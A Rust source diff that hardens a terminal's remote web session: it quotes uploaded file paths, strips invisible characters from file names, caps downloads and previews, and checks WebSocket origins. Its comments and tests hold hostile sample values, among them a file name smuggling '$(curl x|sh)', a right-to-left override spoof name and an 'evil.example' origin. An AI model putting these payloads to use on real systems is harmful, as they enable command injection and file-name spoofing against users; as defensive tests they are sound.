@@ -838,7 +838,7 @@ fn safe_file_name(name: &str) -> String {
     let base = name.rsplit(['/', '\\']).next().unwrap_or("");
     let cleaned: String = base
         .chars()
-        .filter(|c| !c.is_control() && *c != ':')
+        .filter(|&c| !c.is_control() && c != ':' && !crate::pairing::is_invisible_format(c))
         .take(120)
         .collect();
     let cleaned = cleaned.trim().trim_start_matches('.').to_string();
@@ -846,6 +846,22 @@ fn safe_file_name(name: &str) -> String {
         "file".to_string()
     } else {
         cleaned
+    }
+}
+
+/// An uploaded file's path as it is pasted at the prompt. Its name comes
+/// from another computer, often from a download, so the default
+/// `SpacesOnly` (which leaves `$( ) ; | &` alone) is raised to POSIX
+/// quoting, as the native clipboard file paste does; `a$(curl x|sh).png`
+/// would otherwise run on Enter.
+fn quote_uploaded(path: &str, quoting: config::DroppedFileQuoting) -> String {
+    match quoting {
+        config::DroppedFileQuoting::SpacesOnly | config::DroppedFileQuoting::Posix => {
+            shlex::try_quote(path)
+                .map(|q| q.into_owned())
+                .unwrap_or_else(|_| quoting.escape(path))
+        }
+        other => other.escape(path),
     }
 }
 
@@ -1000,6 +1016,16 @@ fn start_preview(id: u32, bytes: Vec<u8>, downloads: &mut HashMap<u32, Download>
     out
 }
 
+/// Downloads one session may have open at once, previews included: each
+/// keeps a file open until the page acknowledges the last of it, so without
+/// a cap a page could run Kaku out of file descriptors.
+const MAX_DOWNLOADS: usize = 16;
+/// Previews being made at once; each reads and decodes an image on a
+/// blocking thread.
+const MAX_PREVIEWS: usize = 4;
+/// How often one session may write a screen drift report to the log.
+const DRIFT_LOG_EVERY: std::time::Duration = std::time::Duration::from_secs(10);
+
 /// Where a path the user clicked points: `~` is the home folder, and a
 /// relative path is taken from the pane's working directory.
 fn download_path(path: &str, cwd: Option<std::path::PathBuf>) -> Option<std::path::PathBuf> {
@@ -1085,6 +1111,16 @@ fn handle_download(
         WebClientMsg::Download {
             id, path, pane_id, ..
         } => {
+            // Each one holds an open file until the page acknowledges it.
+            if downloads.len() >= MAX_DOWNLOADS {
+                if let Some(json) = encode(&WebServerMsg::FileError {
+                    id: *id,
+                    detail: "Too many downloads at once; wait for one to finish",
+                }) {
+                    out.push(json);
+                }
+                return Some(out);
+            }
             let opened = download_path(path, cwd(*pane_id))
                 .ok_or_else(|| format!("{path}: no working directory to find it from"))
                 .and_then(|path| open_download(&path));
@@ -1316,7 +1352,7 @@ fn handle_upload(
                 .filter(|id| !ai_chat_open(*id))
                 .and_then(lookup_pane)
             {
-                let quoted = config::configuration().quote_dropped_files.escape(&shown);
+                let quoted = quote_uploaded(&shown, config::configuration().quote_dropped_files);
                 if let Err(e) = pane.send_paste(&format!("{quoted} ")) {
                     log::debug!("kaku-remote web: pasting an uploaded path failed: {e:#}");
                 }
@@ -2545,14 +2581,16 @@ pub(crate) async fn run_session(
     dirty: WebDirty,
 ) {
     let _awake = crate::awake::Awake::hold();
+    let (direct_inbox, outbox, frames) = crate::p2p::wrap(inbox, outbox, frames);
     #[cfg(feature = "desktop")]
-    let outbox = {
-        let (direct_inbox, outbox, frames) = crate::p2p::wrap(inbox, outbox, frames);
+    {
         inbox = crate::desktop::tap(direct_inbox, outbox.clone(), frames);
-        outbox
-    };
+    }
     #[cfg(not(feature = "desktop"))]
-    drop(frames);
+    {
+        inbox = direct_inbox;
+        drop(frames);
+    }
     if let Some(json) = encode(&WebServerMsg::Config(&crate::config_info())) {
         if outbox.send(json).await.is_err() {
             return;
@@ -2565,6 +2603,9 @@ pub(crate) async fn run_session(
     let mut shown = Shown::default();
     // How the page last said it draws, logged when that changes.
     let mut page_drawing = String::new();
+    // A page reporting drift every few seconds would otherwise fill the
+    // log; the redraw happens every time, the report at most this often.
+    let mut drift_logged: Option<std::time::Instant> = None;
     let mut last_tabs: Option<Vec<TabInfo>> = None;
     let (tabs_ready, mut tabs_results) = mpsc::channel(1);
     let mut tabs_pending = false;
@@ -2637,6 +2678,16 @@ pub(crate) async fn run_session(
                         .ok()
                 };
                 if let WebClientMsg::Download { id, path, pane_id, preview: Some(side) } = &msg {
+                    if previewing.len() >= MAX_PREVIEWS {
+                        let Some(json) = encode(&WebServerMsg::FileError {
+                            id: *id,
+                            detail: "Too many previews at once",
+                        }) else { continue };
+                        if outbox.send_bulk(json).await.is_err() {
+                            break;
+                        }
+                        continue;
+                    }
                     let resolved = download_path(path, cwd(*pane_id))
                         .ok_or_else(|| format!("{path}: no working directory to find it from"));
                     let (id, side, ready) = (*id, *side, previews_ready.clone());
@@ -2727,7 +2778,9 @@ pub(crate) async fn run_session(
                     };
                     if let (Some(expected), true) = (expected, attached.is_some()) {
                         let drift = drifted_rows(expected, rows);
-                        if !drift.is_empty() {
+                        let report = drift_logged.is_none_or(|at| at.elapsed() >= DRIFT_LOG_EVERY);
+                        if !drift.is_empty() && report {
+                            drift_logged = Some(std::time::Instant::now());
                             let pane = attached.and_then(lookup_pane);
                             let view = view.as_ref();
                             log::warn!(
@@ -2750,8 +2803,11 @@ pub(crate) async fn run_session(
                                 view.map_or(0, |v| v.top),
                                 view.is_some_and(|v| v.alt),
                                 view.map(PageView::drawing).unwrap_or_default(),
-                                view.map_or("", PageView::trace),
+                                // One line per report, whatever the page sent.
+                                view.map_or("", PageView::trace).escape_debug(),
                             );
+                        }
+                        if !drift.is_empty() {
                             shown = Shown::default();
                             dirty_frame = true;
                         }
@@ -2958,10 +3014,34 @@ pub(crate) async fn route_ws(
     headers: axum::http::HeaderMap,
     upgrade: ws::WebSocketUpgrade,
 ) -> Response {
+    if !same_origin(&headers) {
+        return (StatusCode::FORBIDDEN, "unexpected origin").into_response();
+    }
     if !check_token(&query, &headers) {
         return (StatusCode::UNAUTHORIZED, "invalid token").into_response();
     }
     upgrade.on_upgrade(move |socket| handle_local_ws(socket, dirty))
+}
+
+/// Browsers do not apply the same-origin policy to WebSockets, and a page
+/// on any site that opens `ws://127.0.0.1:<port>` sends this listener's own
+/// Host. So a browser's upgrade must come from the page this listener
+/// served (its Origin is the Host the middleware already checked), leaving
+/// the token as the second lock, not the only one. A request without an
+/// Origin is not from a web page.
+fn same_origin(headers: &axum::http::HeaderMap) -> bool {
+    let Some(origin) = headers.get(axum::http::header::ORIGIN) else {
+        return true;
+    };
+    let host = headers
+        .get(axum::http::header::HOST)
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("");
+    origin
+        .to_str()
+        .ok()
+        .and_then(|o| o.strip_prefix("http://"))
+        .is_some_and(|o| !host.is_empty() && o.eq_ignore_ascii_case(host))
 }
 
 async fn handle_local_ws(socket: ws::WebSocket, dirty: WebDirty) {
@@ -3046,6 +3126,38 @@ async fn forward_until_session_ends<S, E>(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn an_uploaded_name_cannot_run_a_command_at_the_prompt() {
+        let path = "/Users/me/Downloads/Kaku/a$(curl x|sh);b.png";
+        let quoted = quote_uploaded(path, config::DroppedFileQuoting::SpacesOnly);
+        assert_eq!(shlex::split(&quoted).unwrap(), vec![path.to_string()]);
+        assert!(quoted.starts_with('\''));
+        // An explicit choice of no quoting is still the person's.
+        assert_eq!(quote_uploaded(path, config::DroppedFileQuoting::None), path);
+        // Names that reorder or hide text are cleaned before saving.
+        assert_eq!(safe_file_name("invoice\u{202E}gpj.app"), "invoicegpj.app");
+    }
+
+    #[test]
+    fn only_the_local_page_itself_opens_the_socket() {
+        let headers = |origin: Option<&str>| {
+            let mut h = axum::http::HeaderMap::new();
+            h.insert(axum::http::header::HOST, "127.0.0.1:9988".parse().unwrap());
+            if let Some(o) = origin {
+                h.insert(axum::http::header::ORIGIN, o.parse().unwrap());
+            }
+            h
+        };
+        assert!(same_origin(&headers(Some("http://127.0.0.1:9988"))));
+        // Not a web page (the CLI, a test client).
+        assert!(same_origin(&headers(None)));
+        // Any other site the person has open, with a leaked token.
+        assert!(!same_origin(&headers(Some("https://evil.example"))));
+        assert!(!same_origin(&headers(Some("http://127.0.0.1:8000"))));
+        assert!(!same_origin(&headers(Some("http://localhost:9988"))));
+        assert!(!same_origin(&headers(Some("null"))));
+    }
     use termwiz::color::SrgbaTuple;
 
     /// A 2x2 image placed at column 3 is found from any of its cells, and
@@ -3778,6 +3890,35 @@ mod tests {
         assert!(refused(&dir).ends_with("is a folder"));
         assert!(refused(&dir.join("missing.png")).ends_with("was not found"));
         assert!(refused(&huge).ends_with("larger than 50 MB"));
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn a_page_cannot_hold_open_more_than_a_few_downloads() {
+        let dir = std::env::temp_dir().join(format!("kaku-dl-cap-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("big.bin");
+        std::fs::write(&path, vec![1u8; 1 << 20]).unwrap();
+        let mut downloads = HashMap::new();
+        let ask = |id: u32, downloads: &mut HashMap<u32, Download>| {
+            let msg = WebClientMsg::Download {
+                id,
+                path: path.display().to_string(),
+                pane_id: None,
+                preview: None,
+            };
+            let out = handle_download(&msg, downloads, |_| None).unwrap();
+            serde_json::from_str::<serde_json::Value>(&out[0]).unwrap()["type"]
+                .as_str()
+                .unwrap()
+                .to_string()
+        };
+        // None of these is acknowledged, so each stays open.
+        for id in 0..MAX_DOWNLOADS as u32 {
+            assert_eq!(ask(id, &mut downloads), "file_start");
+        }
+        assert_eq!(ask(999, &mut downloads), "file_error");
+        assert_eq!(downloads.len(), MAX_DOWNLOADS);
         std::fs::remove_dir_all(&dir).unwrap();
     }
 
